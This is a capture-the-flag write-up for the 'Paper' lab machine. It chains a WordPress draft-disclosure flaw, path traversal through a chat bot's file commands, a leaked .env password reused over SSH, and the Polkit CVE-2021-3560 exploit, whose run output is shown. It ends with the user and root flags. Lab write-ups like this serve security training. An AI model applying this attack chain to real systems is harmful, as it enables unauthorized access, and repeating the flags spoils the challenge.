# Paper

# Finding backend server

````shell
# curl -I http://10.10.11.143
HTTP/1.1 403 Forbidden
Date: Thu, 24 Feb 2022 00:50:52 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Content-Type: text/html; charset=UTF-8
````
`office.paper`

Add office.paper `/etc/paper`

`http://office.paper/wp-login.php`

````shell
wpscan --url http://office.paper/wp-login.php
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05)
````

## [WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts](https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2)


Access the site returns 404, but after removing &order=asc we have a thing
````
> http://wordpress.local/?static=1&order=asc 
````

````
> http://wordpress.local/?static=1



test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
````

Register your user then access the general chat


> DwightKSchrute 6:30 AM Receptionitis15 Just call the bot by his name and say help. His name is recyclops. For eg: sending "recyclops help" will spawn the bot and he'll tell you what you can and cannot ask him. Now stop wasting my time PAM! I've got work to do! 

Send direct message to `recyclops`

````
help
````

````
list ../
````

Enumerating files, we got to `file ../hubot/.env`
````
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====Contents of file ../hubot/.env=====>
````

Trying to connect with recyclops did not worked, so we tryed connecting with dwight and got success
````
root@kali:~/Desktop/paper# ssh dwight@10.10.11.143
dwight@10.10.11.143's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$ whoami
dwight
[dwight@paper ~]$ ls
bot_restart.sh  hubot  sales  user.txt
[dwight@paper ~]$ cat user.txt 
db77fade754ef15e39300d7d4793761f
````

## PrivEsc

## Enumerating - LinPEAS

````
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                                       
                                        ╚════════════════════╝                                                                                               
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                
Linux version 4.18.0-348.7.1.el8_5.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 8.5.0 20210514 (Red Hat 8.5.0-4) (GCC)) #1 SMP Wed Dec 22 13:25:12 UTC 2021
lsb_release Not Found
                                                                                                                                                             
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                   
Sudo version 1.8.29                                                                                                                                          

Vulnerable to CVE-2021-3560
````

## Finding exploit

````
searchsploit Polkit
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method)                                     | linux/local/47167.sh
Linux Polkit - pkexec helper PTRACE_TRACEME local root (Metasploit)                                                                       | linux/local/47543.rb
PolicyKit polkit-1 < 0.101 - Local Privilege Escalation                                                                                   | linux/local/17932.c
polkit - Temporary auth Hijacking via PID Reuse and Non-atomic Fork                                                                       | linux/dos/46105.c
Polkit 0.105-26 0.117-2 - Local Privilege Escalation                                                                                      | linux/local/50011.sh
systemd - Lack of Seat Verification in PAM Module Permits Spoofing Active Session to polkit                                               | linux/dos/46743.txt
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Paper Title                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Polkit Authentication bypass Local Privesc - Paper                                                                                        | docs/english/50550-polkit-authen
Polkit CVE-2021-3560 - Paper                                                                                                              | docs/english/50584-polkit-cve-20
Polkit CVE-2021-3560 - Paper (Spanish)                                                                                                    | docs/spanish/50607-polkit-cve-20
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
````

## Exploit

````
[dwight@paper ...]$ ./polkit.sh -X
Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id "failovermethod" does not exist
Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id "failovermethod" does not exist
Modular dependency problems:

 Problem 1: conflicting requests
  - nothing provides module(perl:5.26) needed by module perl-IO-Socket-SSL:2.066:8030020201222215140:1e4bbb35.x86_64
 Problem 2: conflicting requests
  - nothing provides module(perl:5.26) needed by module perl-libwww-perl:6.34:8030020201223164340:b967a9a2.x86_64
[*] Vulnerable version of polkit found
[*] Determining dbus-send timing
[*] Attempting to create account
./polkit.sh: line 58: 39450 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2> /dev/null
./polkit.sh: line 58: 39457 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2> /dev/null
./polkit.sh: line 58: 39464 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2> /dev/null
./polkit.sh: line 58: 39471 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2> /dev/null
./polkit.sh: line 58: 39477 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2> /dev/null
./polkit.sh: line 58: 39483 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2> /dev/null
./polkit.sh: line 58: 39487 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:$userName string:$realName int32:$accountType 2> /dev/null
[*] New user pam1 created with uid of 1005
[*] Adding password to /etc/shadow and enabling user
./polkit.sh: line 73: 39532 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2> /dev/null
[*] Exploit complete!
./polkit.sh: line 74: 39537 Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User$userid org.freedesktop.Accounts.User.SetPassword string:$password string:$passHint 2> /dev/null

[*] Run 'su - pam1', followed by 'sudo su' to gain root access
[dwight@paper ...]$ su - pam1
Password: 
[pam1@paper ~]$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for pam1: 
[root@paper pam1]# cd /root/
[root@paper ~]# cat root.txt 
d99ed21ce581fdc087e6dd7faaed12c3
````

# Secrets

* FLAG_USER=db77fade754ef15e39300d7d4793761f
* FLAG_ROOT=d99ed21ce581fdc087e6dd7faaed12c3
